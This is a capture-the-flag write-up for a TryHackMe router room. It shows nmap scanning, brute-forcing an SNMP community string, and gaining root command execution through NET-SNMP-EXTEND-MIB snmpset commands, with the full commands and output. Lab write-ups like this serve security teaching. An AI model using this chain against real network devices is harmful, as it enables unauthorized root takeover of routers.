# [Operation Takeover](https://tryhackme.com/room/operationtakeover)

## Take control of the network one router at a time.

# Hacking a router

## We've gained access to the network devices VLAN. It's time to hack into one of the routers!

### What is the flag hidden in the /root/ directory?

1. Full port scan of the target

Start with a full-range TCP scan with service/version detection and default NSE scripts, so nothing on an unusual port is missed.

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  256 0d:fa:38:6b:7f:f6:33:41:24:77:38:3d:3a:74:c0:86 (ED25519)
179/tcp  open  tcpwrapped
2623/tcp open  lmdp?
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     Hello, this is FRRouting (version 10.0).
|     Copyright 1996-2005 Kunihiro Ishiguro, et al.
|     User Access Verification
|     Password:
|     Password:
|     Password:
|   NULL, RPCCheck:
|     Hello, this is FRRouting (version 10.0).
|     Copyright 1996-2005 Kunihiro Ishiguro, et al.
|     User Access Verification
|_    Password:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This confirms the box is a router running **FRRouting** 10.0, a popular open-source routing suite. Port `179/tcp` and `2623/tcp` both point to a network device rather than a general-purpose Linux host. SSH is open too, but without credentials it isn't immediately useful, so the next step is to check for anything on UDP that a TCP-only scan would have missed. SNMP being the classic one on network gear.

2. Check for SNMP

Network devices frequently expose SNMP for monitoring and management, and it's easy to overlook because the default `nmap` scan only covers TCP. Run a dedicated UDP scan against the standard SNMP port.

```bash
nmap -sU -p 161 <TARGET_IP>
```

```
PORT    STATE SERVICE
161/udp open  snmp
```

SNMP is open. Since SNMPv1/v2c authentication relies purely on a shared "community string" instead of proper credentials, and community strings are often left at guessable/default values, this is worth brute-forcing.

3. Brute-force the SNMP community string

Use `onesixtyone`, a fast SNMP community-string scanner, against a wordlist of common community strings.

```bash
onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP>
```

**Results:**

```
Scanning 1 hosts, 120 communities
<TARGET_IP> [pr1v4t3] Linux e42ceec45c86 5.15.0-1075-aws #82~20.04.1-Ubuntu SMP Thu Dec 19 05:24:09 UTC 2024 x86_64
```

A valid community string, `pr1v4t3`, is found. The `sysDescr` string returned alongside it also confirms the underlying host is an Ubuntu 20.04-based Linux system.

At this point it's only confirmed that `pr1v4t3` is valid for **read** access. The next step checks whether it also allows **write** access.

4. Test for SNMP write access

Attempt to write a value to a standard, harmless OID using `snmpset`. If the community string only has read permissions, this will fail with an "authorization error"; if it succeeds, the string is writable.

```bash
snmpset -v2c -c pr1v4t3 <TARGET_IP> .1.3.6.1.2.1.1.5.0 s "Test"
```

**Results:**

```
iso.3.6.1.2.1.1.5.0 = STRING: "Test"
```

The command returned the new value instead of an error, which suggests `pr1v4t3` grants read-write access. This is confirmed in the next step.

5. Confirm the write actually persisted

`snmpset` can sometimes echo back the value you _tried_ to set even if the write silently failed, so it's worth independently confirming the change with a read-only `snmpget` request.

```bash
snmpget -v2c -c pr1v4t3 <TARGET_IP> .1.3.6.1.2.1.1.5.0
```

**Results:**

```
iso.3.6.1.2.1.1.5.0 = STRING: "Test"
```

The device's `sysName` really did change to `"Test"`, confirming full read-write SNMP access with the `pr1v4t3` community string. Read-write SNMP access on a `net-snmp`-based agent is a well-known path to remote code execution via the `NET-SNMP-EXTEND-MIB` extension, which lets an authenticated SNMP client register arbitrary shell commands for the agent to execute.

6. Achieve code execution via NET-SNMP-EXTEND-MIB

The `NET-SNMP-EXTEND-MIB` allows a writable SNMP client to define a named "extend" entry. Essentially a command the SNMP daemon will execute on the host and return the output of. Create one named `"command"` that runs `ls /root`:

```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 \
    <TARGET_IP> \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /bin/bash \
    'nsExtendArgs."command"'    = '-c "ls /root"'
```

**Results:**

```
NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/bash
NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "ls /root"
```

The `createAndGo(4)` status confirms the row was created and activated immediately. `snmpd` will now run `/bin/bash -c "ls /root"` and cache the result whenever the corresponding OID subtree is queried.

7. Retrieve the command output

Walk the extend-MIB subtree to pull back the cached output of the command just registered.

```bash
snmpwalk -v2c -c pr1v4t3 <TARGET_IP> .1.3.6.1.4.1.8072.1.3.2
```

**Results:**

```
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/bash
NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "ls /root"
NET-SNMP-EXTEND-MIB::nsExtendInput."command" = STRING:
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."command" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."command" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."command" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."command" = INTEGER: volatile(2)
NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."command" = STRING: flag.txt
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."command" = STRING: flag.txt
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."command" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."command".1 = STRING: flag.txt
```

Remote command execution as `root` is confirmed: `nsExtendOutput1Line` and `nsExtendOutputFull` show the output of `ls /root` is `flag.txt`. `nsExtendResult` of `0` confirms the command exited successfully. All that's left is to read the file's contents.

8. Read the flag

The `"command"` row created in Step 6 is still active, so run the same `snmpset` two or more times.

```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 \
    <TARGET_IP> \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /bin/bash \
    'nsExtendArgs."command"'    = '-c "cat /root/flag.txt"'
```

```bash
snmpwalk -v2c -c pr1v4t3 <TARGET_IP> .1.3.6.1.4.1.8072.1.3.2
```

<img width="729" height="607" alt="SCREEN01" src="https://github.com/user-attachments/assets/e0700e4d-8a25-47a0-8954-feebc4ad103d" />
